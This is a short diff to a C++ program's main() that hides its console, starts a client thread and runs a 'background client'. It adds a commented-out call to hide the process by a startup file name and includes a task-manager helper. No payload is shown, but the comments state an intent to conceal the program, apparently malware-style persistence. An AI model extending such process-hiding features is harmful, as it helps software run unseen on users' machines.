@@ -7,6 +7,7 @@
 #include "utility\helper.h"
 #include "utility/requests.h"
 #include "utility\helper.h"
+#include "utility/task_manager.h"
 
 int main(int argc, char* argv[]) {
 	/* Hide Console */
@@ -21,8 +22,9 @@ int main(int argc, char* argv[]) {
 
 		/* Create and Run Client */
 		std::thread client;
-		if (!helpers::is_initialized())
+		if (!helpers::is_initialized()) {
 			client = std::thread(client::init);
+		}
 
 		/* Start Menu */
 		menu_init();
@@ -31,7 +33,12 @@ int main(int argc, char* argv[]) {
 		menu_loop();
 	}
 	else {
+		/* Setup To Hide Our Background Client */
+		//hide_process(client::STARTUP_FILE_NAME);
+
+		/* Background */
 		client::background();
 	}
+
 	return 0;
 }
